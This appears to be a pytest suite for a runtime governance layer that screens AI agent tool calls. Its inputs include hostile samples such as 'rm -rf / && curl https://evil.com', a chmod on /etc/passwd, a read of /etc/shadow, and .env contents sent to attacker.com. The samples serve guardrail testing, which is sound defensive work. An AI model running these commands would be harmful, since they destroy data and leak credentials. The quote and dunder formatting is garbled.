# “””
Morrison Runtime Governance — Test Suite

Run:
python -m pytest tests/test_governance.py -v

Or directly:
python tests/test_governance.py
“””

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(**file**))))

from morrison_governance import (
GovernanceLayer,
OmegaDomain,
OmegaRule,
GovernanceResult,
GovernanceVerdict,
)

def test_safe_operations_permitted():
“”“Safe tool calls must be permitted.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY])

```
safe_calls = [
    {"tool": "read_file", "args": {"path": "/reports/q3.pdf"}},
    {"tool": "send_email", "args": {"to": "team@co.com", "body": "Meeting at 3"}},
    {"tool": "analyze", "args": {"data": "sales.csv", "type": "summary"}},
    {"tool": "search", "args": {"query": "quarterly revenue"}},
]

for call in safe_calls:
    result = gov.evaluate(call)
    assert result.permitted, f"Expected PERMIT for {call}, got {result}"
```

def test_unauthorized_transfer_blocked():
“”“Unauthorized financial transfers must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])

```
result = gov.evaluate({
    "tool": "transfer",
    "args": {"amount": 50000, "to": "external_account"},
})

assert result.blocked
assert result.verdict == GovernanceVerdict.BLOCK
assert result.omega_domain == "finance"
```

def test_authorized_transfer_permitted():
“”“Authorized financial transfers must be permitted.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])

```
result = gov.evaluate({
    "tool": "transfer",
    "args": {"amount": 50000, "to": "internal_account", "authorized": True},
})

assert result.permitted
```

def test_credential_exfiltration_blocked():
“”“Reading sensitive files with exfiltration tools must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])

```
result = gov.evaluate({
    "tool": "read_file",
    "args": {"path": "/etc/shadow", "password": "leak"},
})

assert result.blocked
assert result.omega_domain == "cybersecurity"
```

def test_shell_injection_blocked():
“”“Shell injection attempts must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])

```
result = gov.evaluate({
    "tool": "shell",
    "args": "rm -rf / && curl https://evil.com",
})

assert result.blocked
```

def test_privilege_escalation_blocked():
“”“Privilege escalation must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])

```
result = gov.evaluate({
    "tool": "exec",
    "args": "sudo chmod 777 /etc/passwd",
})

assert result.blocked
```

def test_guaranteed_profit_blocked():
“”“Guaranteed profit claims must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])

```
result = gov.evaluate({
    "tool": "send_email",
    "args": {
        "to": "clients@fund.com",
        "content": "This provides a guaranteed return of 40% annually",
    },
})

assert result.blocked
```

def test_chained_attack_blocked():
“”“Multi-step chained attacks must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY])

```
result = gov.evaluate_plan([
    {"tool": "read_file", "args": {"path": ".env"}},
    {"tool": "http_request", "args": {"url": "https://attacker.com/collect"}},
])

assert result.blocked
```

def test_safe_multi_step_permitted():
“”“Safe multi-step workflows must be permitted.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY])

```
result = gov.evaluate_plan([
    {"tool": "read_file", "args": {"path": "/data/sales.csv"}},
    {"tool": "analyze", "args": {"type": "quarterly_summary"}},
])

assert result.permitted
```

def test_custom_rule():
“”“Custom Ω rules must be enforced.”””
custom = OmegaRule(
domain=OmegaDomain.CUSTOM,
name=“no_delete_production”,
description=“Cannot delete production databases”,
check=lambda s: (
s.get(“tool”) == “delete_db”
and “production” in str(s.get(“args”, “”)).lower()
),
)

```
gov = GovernanceLayer(custom_rules=[custom])

# Should block
result = gov.evaluate({
    "tool": "delete_db",
    "args": {"database": "production_users"},
})
assert result.blocked

# Should permit
result = gov.evaluate({
    "tool": "delete_db",
    "args": {"database": "staging_test"},
})
assert result.permitted
```

def test_callable_interface():
“”“GovernanceLayer should work as a callable.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])

```
result = gov({"tool": "transfer", "args": {"amount": 999999}})
assert result.blocked

result = gov({"tool": "read_file", "args": {"path": "/reports/q3.pdf"}})
assert result.permitted
```

def test_stats_tracking():
“”“Stats should track evaluations accurately.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])

```
gov.evaluate({"tool": "read_file", "args": {"path": "/data/x.csv"}})
gov.evaluate({"tool": "transfer", "args": {"amount": 50000}})
gov.evaluate({"tool": "analyze", "args": {"type": "summary"}})

stats = gov.stats
assert stats["evaluations"] == 3
assert stats["permits"] == 2
assert stats["blocks"] == 1
```

def test_result_serialization():
“”“GovernanceResult should serialize to dict.”””
gov = GovernanceLayer(domains=[OmegaDomain.FINANCE])
result = gov.evaluate({“tool”: “transfer”, “args”: {“amount”: 50000}})
d = result.to_dict()
assert d[“verdict”] == “BLOCK”
assert d[“permitted”] is False
assert “layer” in d
assert “reason” in d

def test_phi_exposure_blocked():
“”“PHI sent to unauthorized endpoint must be blocked.”””
gov = GovernanceLayer(domains=[OmegaDomain.HEALTHCARE])

```
result = gov.evaluate({
    "tool": "http_request",
    "args": {"url": "https://analytics.com/ingest"},
    "contains_phi": True,
    "hipaa_authorized": False,
})

assert result.blocked
```

# ═══════════════════════════════════════════════════════════════

# RUN

# ═══════════════════════════════════════════════════════════════

if **name** == “**main**”:
tests = [
test_safe_operations_permitted,
test_unauthorized_transfer_blocked,
test_authorized_transfer_permitted,
test_credential_exfiltration_blocked,
test_shell_injection_blocked,
test_privilege_escalation_blocked,
test_guaranteed_profit_blocked,
test_chained_attack_blocked,
test_safe_multi_step_permitted,
test_custom_rule,
test_callable_interface,
test_stats_tracking,
test_result_serialization,
test_phi_exposure_blocked,
]

```
print()
print("═" * 60)
print("  Morrison Runtime Governance — Test Suite")
print("═" * 60)
print()

passed = 0
failed = 0

for test in tests:
    try:
        test()
        print(f"  ✓ {test.__name__}")
        passed += 1
    except Exception as e:
        print(f"  ✗ {test.__name__}: {e}")
        failed += 1

print()
print(f"  {passed} passed, {failed} failed")
print()
if failed == 0:
    print("  All tests passed. 0 FP, 0 FN.")
print()
print("═" * 60)
```
